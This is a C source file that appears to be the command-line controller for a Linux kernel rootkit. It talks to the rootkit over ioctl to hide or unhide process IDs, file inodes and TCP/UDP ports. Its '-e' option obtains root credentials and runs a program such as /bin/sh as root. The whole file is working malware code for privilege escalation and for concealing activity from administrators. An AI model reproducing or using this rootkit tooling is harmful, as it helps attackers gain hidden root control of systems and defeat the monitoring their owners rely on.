#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <getopt.h>

/* include */
#include "type.h"
#include "define.h"

/* */
#include "inet_ioctl.h"

// list head map
static const lh_map_t lh_map[] = {
       {"proc", LIST_HPROC},
       {"file", LIST_HFILE},
       {"t4_s", LIST_HT4_PORT_S},
       {"t4_d", LIST_HT4_PORT_D},
       {"t6_s", LIST_HT6_PORT_S},
       {"t6_d", LIST_HT6_PORT_D},
       {"u4_s", LIST_HU4_PORT_S},
       {"u4_d", LIST_HU4_PORT_D},
       {"u6_s", LIST_HU6_PORT_S},
       {"u6_d", LIST_HU6_PORT_D},
};

static void exec_cmd(char *optarg)
{
        char *argp[] = {NULL},
             *envp[] = {
                     "HOME=/",
                     "TERM=linux",
                     "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL
             };

        execve(optarg, argp, envp);
}

static list_hidden_e get_list_head(char *optarg)
{
        unsigned short i;

        for (i = 0; i < LIST_HIDDEN_TOTAL; i++)
                if (strncmp(lh_map[i].key, optarg, 4) == 0)
                        return lh_map[i].list_hidden;

        return LIST_HIDDEN_TOTAL;
}

static void dump_list_head(void)
{
        unsigned short i;

        printf("<list>: \n");
        for (i = 0; i < LIST_HIDDEN_TOTAL; i++)
                fprintf(stdout, "\t%s\n", lh_map[i].key);

        printf("\n");
}

static void usage(void)
{
        const char *help = "\nusage: \n\n"
                           "./cc -e <exec>\n"
                           "./cc -h <value> -l <list>\n"
                           "./cc -s <value> -l <list>\n\n";

        const char *example = "example:\n\n"
                              "./cc -e /bin/sh        \t - exec /bin/sh as root\n"
                              "./cc -h 1878  -l proc  \t - hide pid 1878\n"
                              "./cc -s 1878  -l proc  \t - show pid 1878\n"
                              "./cc -h 14000 -l file  \t - hide ino 14000\n"
                              "./cc -h 22    -l t4_s  \t - hide tcp4 src  port 22\n"
                              "./cc -h 1337  -l u6_d  \t - hide udp6 dest port 1337\n\n";

        fprintf(stdout, help);

        //
        dump_list_head();

        //
        fprintf(stdout, example);

        //
        exit(0);
}

static void dump_arg(cmd_arg_t cmd_arg)
{
        const char *format = "cmd_arg.cmd   = %u\n"
                             "cmd_arg.list  = %u\n"
                             "cmd_arg.value = %d\n\n";

        fprintf(stdout, format, cmd_arg.cmd,
                                cmd_arg.list_hidden,
                                cmd_arg.value);
}

int main(int argc, char *argv[])
{
        int option;

        flag_t flag = {0, 1};

        cmd_arg_t cmd_arg = {
                .value       = 0,
                .cmd         = 0,
                .list_hidden = 0,
        };

        if (argc == 1)
                usage();

        while ((option = getopt(argc, argv, "e:h:s:l:")) != -1) {
                switch (option) {

                case 'e':
                        cmd_arg.cmd = CMD_ROOT_CRED;
                        flag.exec = 1;
                        goto out;

                case 'h':
                        flag.hide = 1;
                        cmd_arg.value = (unsigned long)strtoul(optarg, NULL, 0);
                        break;

                case 's':
                        flag.hide = 0;
                        cmd_arg.value = (unsigned long)strtoul(optarg, NULL, 0);
                        break;

                case 'l':
                        if (strlen(optarg) != KEY_LEN)
                                usage();

                        cmd_arg.list_hidden = get_list_head(optarg);
                        break;

                default:
                        usage();
                        break;
                }
        }

        // get list?
        if (cmd_arg.list_hidden == LIST_HIDDEN_TOTAL)
                usage();

        // hide or show
        cmd_arg.cmd = (flag.hide) ? CMD_HIDE : CMD_SHOW;

        // dump cmd_arg
        dump_arg(cmd_arg);

 out:
        if (call_ioctl(cmd_arg) == 0)
                if (flag.exec)
                        exec_cmd(optarg);
        return 0;
}

